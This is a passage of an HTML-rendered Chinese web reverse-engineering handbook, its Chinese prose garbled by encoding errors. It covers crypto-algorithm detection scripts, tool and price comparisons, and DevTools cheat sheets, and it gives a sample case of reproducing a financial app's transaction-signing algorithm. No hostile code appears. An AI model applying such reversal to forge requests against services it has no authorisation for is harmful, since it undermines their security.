<span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;{&quot;user&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;}&#39;</span>
<span class="n">encrypted</span> <span class="o">=</span> <span class="n">aes_encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å·¥å…·é›†æˆ">å·¥å…·é›†æˆ</h2>

      <h3 id="æµè§ˆå™¨æ’ä»¶æ£€æµ‹">æµè§ˆå™¨æ’ä»¶æ£€æµ‹</h3>

      <p>å¯ä»¥å°†æ£€æµ‹è„šæœ¬é›†æˆåˆ°æµè§ˆå™¨æ’ä»¶ä¸­ï¼Œå®ç°è‡ªåŠ¨åŒ–åˆ†æï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// content-script.js</span>
<span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">sendMessage</span><span class="p">({</span>
<span class="w">    </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;crypto_detected&#39;</span><span class="p">,</span>
<span class="w">    </span><span class="nx">algorithms</span><span class="o">:</span><span class="w"> </span><span class="nx">detector</span><span class="p">.</span><span class="nx">detectedAlgorithms</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="nodejs-é™æ€åˆ†æ">Node.js é™æ€åˆ†æ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">detector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">CryptoDetector</span><span class="p">();</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;target.js&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">algorithms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">detector</span><span class="p">.</span><span class="nx">detectAlgorithmsInCode</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;æ£€æµ‹åˆ°çš„ç®—æ³•:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">algorithms</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <ol>
        <li><strong>å¤šå±‚æ£€æµ‹</strong>: ç»“åˆå…¨å±€å¯¹è±¡æ‰«æã€ä»£ç ç‰¹å¾åŒ¹é…ã€å¸¸é‡è¯†åˆ«</li>
        <li><strong>åŠ¨æ€ Hook</strong>: ä¼˜å…ˆä½¿ç”¨ Hook è„šæœ¬æ•è·è¿è¡Œæ—¶è°ƒç”¨</li>
        <li><strong>é™æ€åˆ†æ</strong>: å¯¹æ··æ·†ä»£ç å…ˆåæ··æ·†å†æ£€æµ‹</li>
        <li><strong>äº¤å‰éªŒè¯</strong>: é€šè¿‡è¾“å…¥è¾“å‡ºç‰¹å¾éªŒè¯ç®—æ³•è¯†åˆ«ç»“æœ</li>
        <li><strong>ä¿å­˜è¯æ®</strong>: è®°å½•å®Œæ•´çš„åŠ å¯†å‚æ•°ï¼ˆå¯†é’¥ã€IVã€æ¨¡å¼ç­‰ï¼‰</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³å·¥å…·">ç›¸å…³å·¥å…·</h2>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>åŠŸèƒ½</th>
            <th>é“¾æ¥</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>hash-identifier</strong></td>
            <td>å“ˆå¸Œç±»å‹è¯†åˆ«</td>
            <td>https://github.com/blackploit/hash-identifier</td>
          </tr>
          <tr>
            <td><strong>CyberChef</strong></td>
            <td>ç»¼åˆåŠ å¯†åˆ†æ</td>
            <td>https://gchq.github.io/CyberChef/</td>
          </tr>
          <tr>
            <td><strong>Ciphey</strong></td>
            <td>è‡ªåŠ¨è§£å¯†å·¥å…·</td>
            <td>https://github.com/Ciphey/Ciphey</td>
          </tr>
          <tr>
            <td><strong>findcrypt</strong></td>
            <td>IDA æ’ä»¶ï¼ŒæŸ¥æ‰¾åŠ å¯†å¸¸é‡</td>
            <td>https://github.com/you0708/ida/tree/master/idapython_tools/findcrypt</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="å•†ä¸šåŒ–è§£å†³æ–¹æ¡ˆå¯¹æ¯”">å•†ä¸šåŒ–è§£å†³æ–¹æ¡ˆå¯¹æ¯”</h2>

      <p>åœ¨ä¼ä¸šçº§Webé€†å‘é¡¹ç›®ä¸­ï¼Œé™¤äº†å¼€æºå·¥å…·ï¼Œè¿˜æœ‰å¤šç§å•†ä¸šåŒ–è§£å†³æ–¹æ¡ˆå¯é€‰ã€‚ä»¥ä¸‹æ˜¯ä¸“ä¸šå·¥å…·å’ŒæœåŠ¡çš„è¯¦ç»†å¯¹æ¯”ã€‚</p>

      <h3 id="1-å•†ä¸šåŠ å¯†åˆ†æå·¥å…·">1. å•†ä¸šåŠ å¯†åˆ†æå·¥å…·</h3>

      <h4 id="ida-pro-hex-rays-binary-analysis">IDA Pro + Hex-Rays (Binary Analysis)</h4>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>: æ·±åº¦äºŒè¿›åˆ¶åˆ†æã€WASMé€†å‘ã€å¤æ‚åŠ å¯†ç®—æ³•è¯†åˆ«</p>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>ä¸šç•Œæ ‡å‡†çš„åæ±‡ç¼–å·¥å…·</li>
        <li>å¼ºå¤§çš„F5åç¼–è¯‘åŠŸèƒ½</li>
        <li>ä¸°å¯Œçš„æ’ä»¶ç”Ÿæ€ï¼ˆfindcryptã€IDAScopeï¼‰</li>
        <li>æ”¯æŒå¤šç§æ¶æ„ï¼ˆx86ã€ARMã€MIPSã€WASMï¼‰</li>
      </ul>

      <p><strong>åŠ£åŠ¿</strong>:</p>

      <ul>
        <li>ä»·æ ¼æ˜‚è´µï¼ˆä¸ªäººç‰ˆ $385ï¼Œä¸“ä¸šç‰ˆ $1,879+ï¼‰</li>
        <li>å­¦ä¹ æ›²çº¿é™¡å³­</li>
        <li>ä¸»è¦é’ˆå¯¹äºŒè¿›åˆ¶ï¼ŒJavaScriptåˆ†æéœ€é…åˆå…¶ä»–å·¥å…·</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://hex-rays.com/ida-pro/</p>

      <p><strong>æ›¿ä»£æ–¹æ¡ˆ</strong>: Ghidraï¼ˆå…è´¹ï¼ŒNSAå¼€æºï¼‰ã€Binary Ninja</p>

      <hr />

      <h4 id="jeb-decompiler">JEB Decompiler</h4>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>: Android/JavaScriptæ··åˆé€†å‘ã€DEXåˆ†æ</p>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>ä¼˜ç§€çš„Android DEXåç¼–è¯‘</li>
        <li>æ”¯æŒJavaScript/TypeScriptåˆ†æ</li>
        <li>äº¤äº’å¼åæ··æ·†</li>
        <li>å†…ç½®è°ƒè¯•å™¨</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>: ä¸ªäººç‰ˆ $99/æœˆï¼Œä¸“ä¸šç‰ˆ $249/æœˆ</p>

      <p><strong>å®˜ç½‘</strong>: https://www.pnfsoftware.com/</p>

      <hr />

      <h3 id="2-å•†ä¸šåŠ å¯†è¯†åˆ«æœåŠ¡">2. å•†ä¸šåŠ å¯†è¯†åˆ«æœåŠ¡</h3>

      <h4 id="detect-it-easy-die">Detect It Easy (DiE)</h4>

      <p><strong>ç±»å‹</strong>: å…è´¹å·¥å…·ï¼ˆå•†ä¸šçº§è´¨é‡ï¼‰</p>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨è¯†åˆ« PE/ELF/Mach-O æ–‡ä»¶ä¸­çš„åŠ å¯†ç®—æ³•</li>
        <li>æ£€æµ‹åŠ å£³/æ··æ·†æŠ€æœ¯</li>
        <li>ç­¾åæ•°æ®åº“æŒç»­æ›´æ–°</li>
      </ul>

      <p><strong>é€‚ç”¨äº</strong>: Windows/Linux äºŒè¿›åˆ¶åˆ†æ</p>

      <p><strong>GitHub</strong>: https://github.com/horsicq/Detect-It-Easy</p>

      <hr />

      <h4 id="fortify-static-code-analyzer">Fortify Static Code Analyzer</h4>

      <p><strong>ç±»å‹</strong>: ä¼ä¸šçº§é™æ€ä»£ç åˆ†æ</p>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨æ£€æµ‹ä»£ç ä¸­çš„åŠ å¯†å¼±ç‚¹</li>
        <li>è¯†åˆ«ä¸å®‰å…¨çš„åŠ å¯†å®ç°</li>
        <li>åˆè§„æ€§æ£€æŸ¥ï¼ˆOWASPã€PCI DSSï¼‰</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>: ä¼ä¸šå®šä»·ï¼ˆå¹´è´¹ $50,000+ï¼‰</p>

      <p><strong>å®˜ç½‘</strong>: https://www.microfocus.com/en-us/cyberres/application-security/static-code-analyzer</p>

      <p><strong>å¼€æºæ›¿ä»£</strong>: Semgrepã€SonarQube</p>

      <hr />

      <h3 id="3-äº‘ç«¯åŠ å¯†åˆ†æå¹³å°">3. äº‘ç«¯åŠ å¯†åˆ†æå¹³å°</h3>

      <h4 id="virustotal-intelligence">VirusTotal Intelligence</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨è¯†åˆ«æ¶æ„è½¯ä»¶ä¸­çš„åŠ å¯†ç®—æ³•</li>
        <li>å¤§è§„æ¨¡æ ·æœ¬åº“äº¤å‰åˆ†æ</li>
        <li>API æ¥å£é›†æˆ</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>:</p>

      <ul>
        <li>å…è´¹ç‰ˆï¼šæœ‰é™æŸ¥è¯¢</li>
        <li>é«˜çº§ç‰ˆï¼š$500/æœˆèµ·</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.virustotal.com/</p>

      <p><strong>åº”ç”¨</strong>: æ ·æœ¬å¿«é€Ÿåˆ†æã€åŠ å¯†ç‰¹å¾åº“æŸ¥è¯¢</p>

      <hr />

      <h4 id="hybrid-analysis">Hybrid Analysis</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>æ²™ç®±åŠ¨æ€åˆ†æ</li>
        <li>è‡ªåŠ¨æå–åŠ å¯†å¯†é’¥</li>
        <li>ç½‘ç»œæµé‡è§£å¯†</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>:</p>

      <ul>
        <li>å…è´¹ç¤¾åŒºç‰ˆ</li>
        <li>ä¼ä¸šç‰ˆï¼šå®šåˆ¶åŒ–å®šä»·</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.hybrid-analysis.com/</p>

      <hr />

      <h3 id="4-ä¸“ä¸šå’¨è¯¢æœåŠ¡">4. ä¸“ä¸šå’¨è¯¢æœåŠ¡</h3>

      <h4 id="trail-of-bits-å®‰å…¨å’¨è¯¢">Trail of Bits (å®‰å…¨å’¨è¯¢)</h4>

      <p><strong>æœåŠ¡å†…å®¹</strong>:</p>

      <ul>
        <li>å®šåˆ¶åŒ–åŠ å¯†ç®—æ³•é€†å‘</li>
        <li>æ™ºèƒ½åˆçº¦å®¡è®¡</li>
        <li>åè®®åˆ†æ</li>
      </ul>

      <p><strong>å…¸å‹é¡¹ç›®</strong>: $20,000 - $200,000</p>

      <p><strong>å®˜ç½‘</strong>: https://www.trailofbits.com/</p>

      <hr />

      <h4 id="ncc-group-cryptography-services">NCC Group (Cryptography Services)</h4>

      <p><strong>æœåŠ¡å†…å®¹</strong>:</p>

      <ul>
        <li>åŠ å¯†åè®®è®¾è®¡å®¡æŸ¥</li>
        <li>å¯†ç å­¦å®ç°å®¡è®¡</li>
        <li>ä¾§ä¿¡é“æ”»å‡»æµ‹è¯•</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.nccgroup.com/</p>

      <hr />

      <h3 id="5-å¼€æº-vs-å•†ä¸šæ–¹æ¡ˆå¯¹æ¯”">5. å¼€æº vs å•†ä¸šæ–¹æ¡ˆå¯¹æ¯”</h3>

      <table>
        <thead>
          <tr>
            <th>ç»´åº¦</th>
            <th>å¼€æºæ–¹æ¡ˆ</th>
            <th>å•†ä¸šæ–¹æ¡ˆ</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>æˆæœ¬</strong></td>
            <td>å…è´¹</td>
            <td>$100/æœˆ - $50,000/å¹´+</td>
          </tr>
          <tr>
            <td><strong>å­¦ä¹ æ›²çº¿</strong></td>
            <td>ä¸­ç­‰</td>
            <td>è¾ƒä½ï¼ˆæœ‰æ”¯æŒï¼‰</td>
          </tr>
          <tr>
            <td><strong>åŠŸèƒ½å®Œæ•´æ€§</strong></td>
            <td>åŸºç¡€-ä¸­ç­‰</td>
            <td>é«˜çº§-ä¼ä¸šçº§</td>
          </tr>
          <tr>
            <td><strong>æ›´æ–°é¢‘ç‡</strong></td>
            <td>ç¤¾åŒºé©±åŠ¨</td>
            <td>å®šæœŸæ›´æ–° + æŠ€æœ¯æ”¯æŒ</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨è§„æ¨¡</strong></td>
            <td>ä¸ªäºº-å°å›¢é˜Ÿ</td>
            <td>ä¸­å¤§å‹ä¼ä¸š</td>
          </tr>
          <tr>
            <td><strong>æ³•å¾‹åˆè§„</strong></td>
            <td>éœ€è‡ªè¡Œå®¡æŸ¥</td>
            <td>æä¾›åˆè§„ä¿è¯</td>
          </tr>
          <tr>
            <td><strong>æŠ€æœ¯æ”¯æŒ</strong></td>
            <td>ç¤¾åŒºè®ºå›</td>
            <td>7x24 ä¸“ä¸šæ”¯æŒ</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="6-æ¨èæŠ€æœ¯é€‰å‹">6. æ¨èæŠ€æœ¯é€‰å‹</h3>

      <h4 id="ä¸ªäººå­¦ä¹ å°å›¢é˜Ÿ">ä¸ªäººå­¦ä¹ /å°å›¢é˜Ÿ</h4>

      <p><strong>æ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>CyberChefï¼ˆåœ¨çº¿åˆ†æï¼‰</li>
        <li>Cipheyï¼ˆè‡ªåŠ¨è§£å¯†ï¼‰</li>
        <li>è‡ªå»ºæ£€æµ‹è„šæœ¬</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $0</p>

      <hr />

      <h4 id="åˆåˆ›å…¬å¸ä¸­å°ä¼ä¸š">åˆåˆ›å…¬å¸/ä¸­å°ä¼ä¸š</h4>

      <p><strong>æ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>JEB Decompilerï¼ˆ$99-249/æœˆï¼‰</li>
        <li>VirusTotal Intelligenceï¼ˆ$500/æœˆï¼‰</li>
        <li>å¼€æºå·¥å…· + å•†ä¸šå·¥å…·ç»„åˆ</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $1,000-3,000/æœˆ</p>

      <hr />

      <h4 id="å¤§å‹ä¼ä¸šå®‰å…¨å…¬å¸">å¤§å‹ä¼ä¸š/å®‰å…¨å…¬å¸</h4>

      <p><strong>æ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>IDA Pro å›¢é˜Ÿè®¸å¯</li>
        <li>Fortify/Checkmarx ä¼ä¸šç‰ˆ</li>
        <li>ä¸“ä¸šå’¨è¯¢æœåŠ¡ï¼ˆæŒ‰éœ€ï¼‰</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: $50,000-200,000/å¹´</p>

      <hr />

      <h3 id="7-æ–°å…´è¶‹åŠ¿aié©±åŠ¨çš„åŠ å¯†åˆ†æ">7. æ–°å…´è¶‹åŠ¿ï¼šAIé©±åŠ¨çš„åŠ å¯†åˆ†æ</h3>

      <h4 id="anthropic-claudeopenai-gpt-llmè¾…åŠ©">Anthropic Claude/OpenAI GPT (LLMè¾…åŠ©)</h4>

      <p><strong>åº”ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>ä»£ç ç‰‡æ®µå¿«é€Ÿåˆ†æ</li>
        <li>åŠ å¯†ç®—æ³•è¯†åˆ«è¾…åŠ©</li>
        <li>ä¼ªä»£ç ç”Ÿæˆ</li>
      </ul>

      <p><strong>å±€é™æ€§</strong>:</p>

      <ul>
        <li>æ— æ³•å¤„ç†å¤§è§„æ¨¡ä»£ç </li>
        <li>å¯èƒ½äº§ç”Ÿè¯¯åˆ¤</li>
        <li>ä¸é€‚åˆä¿å¯†é¡¹ç›®</li>
      </ul>

      <p><strong>æˆæœ¬</strong>: APIè°ƒç”¨è´¹ç”¨ï¼ˆ$0.01-0.06/1K tokensï¼‰</p>

      <hr />

      <h4 id="zerocopter-ai-code-analysis">Zerocopter AI Code Analysis</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>AIé©±åŠ¨çš„æ¼æ´æ£€æµ‹</li>
        <li>è‡ªåŠ¨è¯†åˆ«åŠ å¯†å¼±ç‚¹</li>
        <li>æ™ºèƒ½æ¨èä¿®å¤æ–¹æ¡ˆ</li>
      </ul>

      <p><strong>çŠ¶æ€</strong>: æµ‹è¯•é˜¶æ®µ</p>

      <hr />

      <h3 id="8-å®é™…æ¡ˆä¾‹å¯¹æ¯”">8. å®é™…æ¡ˆä¾‹å¯¹æ¯”</h3>

      <h4 id="æ¡ˆä¾‹-æŸé‡‘èappåŠ å¯†é€†å‘">æ¡ˆä¾‹: æŸé‡‘èAPPåŠ å¯†é€†å‘</h4>

      <p><strong>éœ€æ±‚</strong>: è¯†åˆ«å¹¶å¤ç°äº¤æ˜“ç­¾åç®—æ³•</p>

      <p><strong>æ–¹æ¡ˆAï¼ˆå¼€æºï¼‰</strong>:</p>

      <ul>
        <li>å·¥å…·: Frida + è‡ªå†™Hookè„šæœ¬</li>
        <li>æ—¶é—´: 3-5å¤©</li>
        <li>æˆæœ¬: $0</li>
        <li>é£é™©: éœ€è¦ä¸“ä¸šæŠ€èƒ½</li>
      </ul>

      <p><strong>æ–¹æ¡ˆBï¼ˆå•†ä¸šï¼‰</strong>:</p>

      <ul>
        <li>å·¥å…·: JEB Decompiler + Trail of Bits å’¨è¯¢</li>
        <li>æ—¶é—´: 1-2å¤©</li>
        <li>æˆæœ¬: $5,000-15,000</li>
        <li>é£é™©: ä½ï¼Œæœ‰ä¸“ä¸šä¿éšœ</li>
      </ul>

      <p><strong>ç»“è®º</strong>: ç´§æ€¥é¡¹ç›®æˆ–ç¼ºä¹ç»éªŒæ—¶ï¼Œå•†ä¸šæ–¹æ¡ˆROIæ›´é«˜</p>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#07-Scripts-javascript-hook-scripts">JavaScript Hook è„šæœ¬</a></li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
        <li><a href="../03-Algorithms/common_crypto_algorithms.md">å¸¸è§åŠ å¯†ç®—æ³•åˆ†æ</a></li>
      </ul>

    </div>
  </div>
  <div class="chapter">
    <h1 class="no-page-break">ğŸ“„ Part VIII: Reference</h1>

    <div class="section" id="08-Cheat-Sheets-index">
      <h2>62. Overview</h2>
      <h1 id="é€ŸæŸ¥è¡¨-cheat-sheets">é€ŸæŸ¥è¡¨ - Cheat Sheets</h1>

      <p>å¿«é€Ÿå‚è€ƒæ‰‹å†Œï¼Œå¸®åŠ©ä½ åœ¨é€†å‘è¿‡ç¨‹ä¸­å¿«é€ŸæŸ¥æ‰¾å¸¸ç”¨å‘½ä»¤ã€ç‰¹å¾å’Œé…ç½®ã€‚</p>

      <hr />

      <h2 id="å¯ç”¨é€ŸæŸ¥è¡¨">ğŸ“š å¯ç”¨é€ŸæŸ¥è¡¨</h2>

      <h3 id="å¸¸ç”¨å‘½ä»¤08-cheat-sheets-common-commands">ğŸ–¥ï¸ <a href="#08-Cheat-Sheets-common-commands">å¸¸ç”¨å‘½ä»¤</a></h3>

      <ul>
        <li>Chrome DevTools å‘½ä»¤</li>
        <li>Python å¸¸ç”¨åº“ç”¨æ³•</li>
        <li>cURL å‘½ä»¤ç¤ºä¾‹</li>
        <li>Git å¸¸ç”¨æ“ä½œ</li>
      </ul>

      <h3 id="åŠ å¯†ç®—æ³•ç‰¹å¾08-cheat-sheets-crypto-signatures">ğŸ” <a href="#08-Cheat-Sheets-crypto-signatures">åŠ å¯†ç®—æ³•ç‰¹å¾</a></h3>

      <ul>
        <li>MD5/SHA/AES è¯†åˆ«ç‰¹å¾</li>
        <li>å¸¸è§åŠ å¯†åº“ç‰¹å¾ç </li>
        <li>è¾“å‡ºæ ¼å¼å¯¹ç…§è¡¨</li>
        <li>åŠ å¯†ç®—æ³•å‚æ•°</li>
      </ul>

      <h3 id="å·¥å…·å¿«æ·é”®08-cheat-sheets-tool-shortcuts">âŒ¨ï¸ <a href="#08-Cheat-Sheets-tool-shortcuts">å·¥å…·å¿«æ·é”®</a></h3>

      <ul>
        <li>Chrome DevTools å¿«æ·é”®</li>
        <li>VS Code å¿«æ·é”®</li>
        <li>Burp Suite å¿«æ·é”®</li>
        <li>å¸¸ç”¨å·¥å…·å¿«æ·æ“ä½œ</li>
      </ul>

      <h3 id="æ­£åˆ™è¡¨è¾¾å¼08-cheat-sheets-regex-patterns">ğŸ” <a href="#08-Cheat-Sheets-regex-patterns">æ­£åˆ™è¡¨è¾¾å¼</a></h3>

      <ul>
        <li>URL åŒ¹é…æ¨¡å¼</li>
        <li>å¸¸è§åŠ å¯†ç‰¹å¾æ­£åˆ™</li>
        <li>æ•°æ®æå–æ­£åˆ™</li>
        <li>éªŒè¯è§„åˆ™æ­£åˆ™</li>
      </ul>

      <h3 id="http-å¤´é€ŸæŸ¥08-cheat-sheets-http-headers">ğŸŒ <a href="#08-Cheat-Sheets-http-headers">HTTP å¤´é€ŸæŸ¥</a></h3>

      <ul>
        <li>å¸¸è§è¯·æ±‚å¤´</li>
        <li>å¸¸è§å“åº”å¤´</li>
        <li>å®‰å…¨ç›¸å…³å¤´</li>
        <li>è‡ªå®šä¹‰å¤´ç¤ºä¾‹</li>
      </ul>

      <hr />

      <h2 id="å¦‚ä½•ä½¿ç”¨">ğŸ’¡ å¦‚ä½•ä½¿ç”¨</h2>

      <p>æ¯ä¸ªé€ŸæŸ¥è¡¨éƒ½é‡‡ç”¨è¡¨æ ¼æˆ–åˆ—è¡¨æ ¼å¼ï¼Œæ–¹ä¾¿å¿«é€ŸæŸ¥æ‰¾ï¼š</p>

      <ul>
        <li><strong>åˆ†ç±»æ¸…æ™°</strong>: æŒ‰åŠŸèƒ½åˆ†ç»„</li>
        <li><strong>ç¤ºä¾‹ä¸°å¯Œ</strong>: æ¯ä¸ªæ¡ç›®éƒ½æœ‰ç¤ºä¾‹</li>
        <li><strong>å³æŸ¥å³ç”¨</strong>: å¯ç›´æ¥å¤åˆ¶ç²˜è´´</li>
      </ul>

      <hr />

      <h2 id="æ¨èæ”¶è—">ğŸ”– æ¨èæ”¶è—</h2>

      <p>å°†è¿™ä¸ªé¡µé¢æ·»åŠ ä¸ºæµè§ˆå™¨ä¹¦ç­¾ï¼Œæ–¹ä¾¿éšæ—¶æŸ¥é˜…ï¼š</p>

      <pre><code>Ctrl+D (Windows/Linux)
Cmd+D (macOS)
</code></pre>

      <hr />

      <h2 id="ç¦»çº¿ä½¿ç”¨">ğŸ“¥ ç¦»çº¿ä½¿ç”¨</h2>

      <p>ä½ å¯ä»¥å°†æ•´ä¸ªæ–‡æ¡£å¯¼å‡ºä¸º PDFï¼š</p>

      <div class="codehilite">
        <pre><span></span><code>mkdocs<span class="w"> </span>build
<span class="c1"># ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€ site/index.html</span>
<span class="c1"># æ‰“å°ä¸º PDF</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ‰¾ä¸åˆ°æƒ³è¦çš„å†…å®¹">ğŸ†˜ æ‰¾ä¸åˆ°æƒ³è¦çš„å†…å®¹ï¼Ÿ</h2>

      <p>å¦‚æœé€ŸæŸ¥è¡¨ä¸­æ²¡æœ‰ä½ éœ€è¦çš„å†…å®¹ï¼š</p>

      <ol>
        <li>æŸ¥çœ‹ <a href="#11-Resources-faq">FAQ</a></li>
        <li>æŸ¥çœ‹ <a href="../10-Troubleshooting/">Troubleshooting</a></li>
        <li>æŸ¥çœ‹å…·ä½“çš„æŠ€æœ¯ç« èŠ‚</li>
      </ol>

      <hr />

      <p>Happy Referencing! ğŸ“–</p>

    </div>

    <div class="section" id="08-Cheat-Sheets-common-commands">
      <h2>63. Common Commands</h2>
      <h1 id="å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨">å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨</h1>

      <h2 id="chrome-devtools-console-å‘½ä»¤">Chrome DevTools Console å‘½ä»¤</h2>

      <h3 id="é€‰æ‹©å…ƒç´ ">é€‰æ‹©å…ƒç´ </h3>

      <table>
        <thead>
          <tr>
            <th>å‘½ä»¤</th>
            <th>è¯´æ˜</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>$()</code></td>
            <td>ç­‰åŒäº <code>document.querySelector()</code></td>
            <td><code>$('#username')</code></td>
          </tr>
          <tr>
            <td><code>$$()</code></td>
            <td>ç­‰åŒäº <code>document.querySelectorAll()</code></td>
            <td><code>$$('.item')</code></td>
          </tr>
          <tr>
            <td><code>$x()</code></td>
            <td>XPath é€‰æ‹©å™¨</td>
            <td><code>$x('//div[@class="container"]')</code></td>
          </tr>
          <tr>
            <td><code>$0</code></td>
            <td>å½“å‰é€‰ä¸­çš„å…ƒç´ </td>
            <td><code>$0.innerHTML</code></td>
          </tr>
          <tr>
            <td><code>$1</code></td>
            <td>ä¸Šä¸€ä¸ªé€‰ä¸­çš„å…ƒç´ </td>
            <td><code>$1.classList</code></td>
          </tr>
        </tbody>
      </table>

      <h3 id="å®ç”¨å‡½æ•°">å®ç”¨å‡½æ•°</h3>

      <table>
        <thead>
          <tr>
            <th>å‘½ä»¤</th>
            <th>è¯´æ˜</th>
            <th>ç¤ºä¾‹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>copy()</code></td>
            <td>å¤åˆ¶åˆ°å‰ªè´´æ¿</td>
            <td><code>copy($0)</code></td>
          </tr>
          <tr>
            <td><code>clear()</code></td>
            <td>æ¸…ç©º Console</td>
            <td><code>clear()</code></td>
          </tr>
          <tr>
            <td><code>keys()</code></td>
            <td>è·å–å¯¹è±¡æ‰€æœ‰é”®</td>
            <td><code>keys(window)</code></td>
          </tr>
          <tr>
            <td><code>values()</code></td>
            <td>è·å–å¯¹è±¡æ‰€æœ‰å€¼</td>
            <td><code>values(localStorage)</code></td>
          </tr>
          <tr>
            <td><code>monitor()</code></td>
            <td>ç›‘æ§å‡½æ•°è°ƒç”¨</td>
            <td><code>monitor(fetch)</code></td>
          </tr>
          <tr>
            <td><code>unmonitor()</code></td>
            <td>å–æ¶ˆç›‘æ§</td>
            <td><code>unmonitor(fetch)</code></td>
          </tr>
          <tr>
            <td><code>table()</code></td>
            <td>è¡¨æ ¼æ˜¾ç¤ºæ•°æ®</td>
            <td><code>table([{name:'a',age:20}])</code></td>
          </tr>
          <tr>
            <td><code>debug()</code></td>
            <td>åœ¨å‡½æ•°ç¬¬ä¸€è¡Œè®¾æ–­ç‚¹</td>
            <td><code>debug(myFunction)</code></td>
          </tr>
          <tr>
            <td><code>undebug()</code></td>
            <td>ç§»é™¤æ–­ç‚¹</td>
            <td><code>undebug(myFunction)</code></td>
          </tr>
        </tbody>
      </table>

      <h3 id="ç½‘ç»œç›¸å…³">ç½‘ç»œç›¸å…³</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æŸ¥çœ‹æ‰€æœ‰ Cookie</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span>

<span class="c1">// æ¸…ç©ºæ‰€æœ‰ Cookie</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">).</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">c</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">c</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/^ +/</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/=.*/</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;=;expires=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">().</span><span 